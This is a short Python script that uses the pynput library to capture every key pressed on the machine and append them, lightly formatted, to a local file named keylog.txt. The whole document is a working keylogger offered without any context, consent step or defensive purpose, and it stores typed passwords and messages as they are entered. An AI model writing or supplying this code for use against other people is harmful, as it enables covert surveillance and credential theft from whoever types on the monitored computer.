from pynput import keyboard

# Specify the log file
log_file = "keylog.txt"

# Function to write the key press event to the log file
def write_to_file(key):
    # Clean up the key format
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif "Key" in key:
        key = f"[{key.replace('Key.', '')}]"
    
    # Write the key press to the file
    with open(log_file, "a") as f:
        f.write(key)

# On key press
def on_press(key):
    write_to_file(key)

# Listener for the key press
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
